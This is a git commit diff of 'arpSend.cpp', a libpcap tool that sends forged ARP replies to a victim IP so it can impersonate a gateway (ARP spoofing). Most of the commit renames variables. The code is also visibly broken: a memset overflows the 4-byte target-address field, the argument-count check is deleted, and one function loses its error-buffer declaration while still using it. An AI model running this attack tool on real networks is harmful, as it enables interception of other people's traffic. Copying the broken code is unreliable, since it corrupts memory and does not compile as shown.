bfbc2fcd0bf02016a4eba63568a59ae31bd2cf80
michaelparkerr <50687117+michaelparkerr@users.noreply.github.com>
2019-08-05 14:51:06 +0900

    Update arpSend.cpp

--- arpSend.cpp
+++ arpSend.cpp
@@ -8,16 +8,16 @@
 #include <netinet/if_ether.h>
 #include <sys/ioctl.h>
 #include <unistd.h>
-#include <stdint.h>
+#include<stdint.h>
 
 
-void ArpSpoof(const char* NameCheck, const char* IPStringSender, const char* IPStringTarget, const u_char* Packet) {
+void ArpSpoof(const char* if_name, const char* sender_ip_string, const char* target_ip_string, const u_char* packet) {
 
 	struct ifreq ifr;
-	size_t NameLengthCheck = strlen(NameCheck);
-	if (NameLengthCheck < sizeof(ifr.ifr_name)) {
-		memcpy(ifr.ifr_name, NameCheck, NameLengthCheck);
-		ifr.ifr_name[NameLengthCheck] = 0;
+	size_t if_name_len = strlen(if_name);
+	if (if_name_len < sizeof(ifr.ifr_name)) {
+		memcpy(ifr.ifr_name, if_name, if_name_len);
+		ifr.ifr_name[if_name_len] = 0;
 	}
 	else {
 		fprintf(stderr, "interface name is too long");
@@ -29,7 +29,6 @@ void ArpSpoof(const char* NameCheck, const char* IPStringSender, const char* IPS
 		perror(0);
 		exit(1);
 	}
-
 	if (ioctl(fd, SIOCGIFHWADDR, &ifr) == -1) {
 		perror(0);
 		close(fd);
@@ -41,34 +40,31 @@ void ArpSpoof(const char* NameCheck, const char* IPStringSender, const char* IPS
 		return; 
 	}
 
-	unsigned char* CheckMyMACAdd = (unsigned char*)ifr.ifr_hwaddr.sa_data;
-	struct ethernetHeader header;
+	unsigned char* my_mac_addr = (unsigned char*)ifr.ifr_hwaddr.sa_data; // get my mac address
+	struct ether_header header;
 
-	header.ethernetType = htons(ETH_P_ARP);
-	memcpy(header.ether_shost, CheckMyMACAdd, sizeof(header.ether_shost));
-	memcpy(header.ethernetDestinationMacAddress, Packet + 0x16, sizeof(header.ethernetDestinationMacAddress));
+	header.ether_type = htons(ETH_P_ARP);
+	memcpy(header.ether_shost, my_mac_addr, sizeof(header.ether_shost));
+	memcpy(header.ether_dhost, packet + 0x16, sizeof(header.ether_dhost));
 
-	struct ethernetArp req;
-	req.arpHardwareAddressType = htons(ARPHRD_ETHER);
-	req.arpProtocolAddressType = htons(ETH_P_IP);
-	req.arpHardwareAddressLength = ETHER_ADDR_LEN;
-	req.arpProtocolAddressLength = sizeof(in_addr_t);
-	req.arpOperation = htons(ARPOP_REPLY);
-	memcpy(&req.arp_sha, CheckMyMACAdd, sizeof(req.arp_sha));
+	struct ether_arp req;
+	req.arp_hrd = htons(ARPHRD_ETHER);
+	req.arp_pro = htons(ETH_P_IP);
+	req.arp_hln = ETHER_ADDR_LEN;
+	req.arp_pln = sizeof(in_addr_t);
+	req.arp_op = htons(ARPOP_REPLY);
+	memcpy(&req.arp_sha, my_mac_addr, sizeof(req.arp_sha));
+	memcpy(&req.arp_spa, packet + 0x1c, 0x04);
+	memcpy(&req.arp_tha, packet + 0x16, sizeof(req.arp_tha));
+	memset(&req.arp_tpa, inet_addr(sender_ip_string), 0x32);//
 
-	memcpy(&req.arp_spa, Packet + 0x1c, 0x04);
-	memcpy(&req.arp_tha, Packet + 0x16, sizeof(req.arp_tha));
-
-	memset(&req.arp_tpa, inet_addr(IPStringSender), 0x32);
-
-
-	unsigned char frame[sizeof(struct ethernetHeader) + sizeof(struct ethernetArp)];
-	memcpy(frame, &header, sizeof(struct ethernetHeader));
-	memcpy(frame + sizeof(struct ethernetHeader), &req, sizeof(struct ethernetArp));
+	unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+	memcpy(frame, &header, sizeof(struct ether_header));
+	memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));
 
 	char pcap_errbuf[PCAP_ERRBUF_SIZE];
 	pcap_errbuf[0] = '\0';
-	pcap_t* pcap = pcap_open_live(NameCheck, 96, 0, 0, pcap_errbuf);
+	pcap_t* pcap = pcap_open_live(if_name, 96, 0, 0, pcap_errbuf);
 	if (pcap_errbuf[0] != '\0') {
 		fprintf(stderr, "%s\n", pcap_errbuf);
 	}
@@ -78,39 +74,38 @@ void ArpSpoof(const char* NameCheck, const char* IPStringSender, const char* IPS
 
 
 
-	pcap_sendPacket(pcap, frame, sizeof(frame));
+	pcap_sendpacket(pcap, frame, sizeof(frame));
 	pcap_close(pcap);
-
 	return;
 
 }
 
-void Send_ArpRequest(const char* NameCheck, const char* IPStringSender, const char* IPStringTarget) {
+void Send_ArpRequest(const char* if_name, const char* sender_ip_string, const char* target_ip_string) {
 
-	struct ethernetHeader header;
-	header.ethernetType = htons(ETH_P_ARP);
-	memset(header.ethernetDestinationMacAddress, 0xff, sizeof(header.ethernetDestinationMacAddress));
+	struct ether_header header;
+	header.ether_type = htons(ETH_P_ARP);
+	memset(header.ether_dhost, 0xff, sizeof(header.ether_dhost));
 
-	struct ethernetArp req;
-	req.arpHardwareAddressType = htons(ARPHRD_ETHER);
-	req.arpProtocolAddressType = htons(ETH_P_IP);
-	req.arpHardwareAddressLength = ETHER_ADDR_LEN;
-	req.arpProtocolAddressLength = sizeof(in_addr_t);
-	req.arpOperation = htons(ARPOP_REQUEST);
+	struct ether_arp req;
+	req.arp_hrd = htons(ARPHRD_ETHER);
+	req.arp_pro = htons(ETH_P_IP);
+	req.arp_hln = ETHER_ADDR_LEN;
+	req.arp_pln = sizeof(in_addr_t);
+	req.arp_op = htons(ARPOP_REQUEST);
 	memset(&req.arp_tha, 0, sizeof(req.arp_tha));
 
 	struct in_addr sender_ip_addr = { 0 };
-	if (!inet_aton(IPStringSender, &sender_ip_addr)) {
-		fprintf(stderr, "%s is not a valid IP address", IPStringSender);
+	if (!inet_aton(sender_ip_string, &sender_ip_addr)) {
+		fprintf(stderr, "%s is not a valid IP address", sender_ip_string);
 		exit(1);
 	}
 	memcpy(&req.arp_tpa, &sender_ip_addr.s_addr, sizeof(req.arp_tpa));
 
 	struct ifreq ifr;
-	size_t NameLengthCheck = strlen(NameCheck);
-	if (NameLengthCheck < sizeof(ifr.ifr_name)) {
-		memcpy(ifr.ifr_name, NameCheck, NameLengthCheck);
-		ifr.ifr_name[NameLengthCheck] = 0;
+	size_t if_name_len = strlen(if_name);
+	if (if_name_len < sizeof(ifr.ifr_name)) {
+		memcpy(ifr.ifr_name, if_name, if_name_len);
+		ifr.ifr_name[if_name_len] = 0;
 	}
 	else {
 		fprintf(stderr, "interface name is too long");
@@ -146,16 +141,15 @@ void Send_ArpRequest(const char* NameCheck, const char* IPStringSender, const ch
 	memcpy(&req.arp_sha, source_mac_addr, sizeof(req.arp_sha));
 	close(fd);
 
-	unsigned char frame[sizeof(struct ethernetHeader) + sizeof(struct ethernetArp)];
-	memcpy(frame, &header, sizeof(struct ethernetHeader));
-	memcpy(frame + sizeof(struct ethernetHeader), &req, sizeof(struct ethernetArp));
+	unsigned char frame[sizeof(struct ether_header) + sizeof(struct ether_arp)];
+	memcpy(frame, &header, sizeof(struct ether_header));
+	memcpy(frame + sizeof(struct ether_header), &req, sizeof(struct ether_arp));
 
-	char pcap_errbuf[PCAP_ERRBUF_SIZE];
 	struct pcap_pkthdr h;
-	const u_char* Packet;
+	const u_char* packet;
 	pcap_errbuf[0] = '\0';
 
-	pcap_t* pcap = pcap_open_live(NameCheck, 96, 0, 0, pcap_errbuf);
+	pcap_t* pcap = pcap_open_live(if_name, 96, 0, 0, pcap_errbuf);
 	if (pcap_errbuf[0] != '\0') {
 		fprintf(stderr, "%s\n", pcap_errbuf);
 	}
@@ -163,32 +157,27 @@ void Send_ArpRequest(const char* NameCheck, const char* IPStringSender, const ch
 		exit(1);
 	}
 
+	// Write the Ethernet frame to the interface.
 	if (pcap_inject(pcap, frame, sizeof(frame)) == -1) {
 		pcap_perror(pcap, 0);
 		pcap_close(pcap);
 		exit(1);
 	}
-	Packet = pcap_next(pcap, &h);
-	ArpSpoof(NameCheck, IPStringSender, IPStringTarget, Packet);
+	packet = pcap_next(pcap, &h);
+	ArpSpoof(if_name, sender_ip_string, target_ip_string, packet);
 	pcap_close(pcap);
 }
 
 int main(int argc, const char* argv[])
 {
 
-	if (argc != 4)
-	{
-		printf("wrong!\n[format] sudo ./send_arp <devname> <victim ip> <gateway ip>\n");
-		return -1;
-	}
-
-	const char* NameCheck = argv[1];
-	const char* IPStringSender = argv[2];
-	const char* IPStringTarget = argv[3];
+	const char* if_name = argv[1];
+	const char* sender_ip_string = argv[2];
+	const char* target_ip_string = argv[3];
 	char* my_ip_string;
-	char* sender_Packet[0x3c];
+	char* sender_packet[0x3c];
 
-	Send_ArpRequest(NameCheck, IPStringSender, IPStringTarget);
+	Send_ArpRequest(if_name, sender_ip_string, target_ip_string);
 
 	return 0;
 }
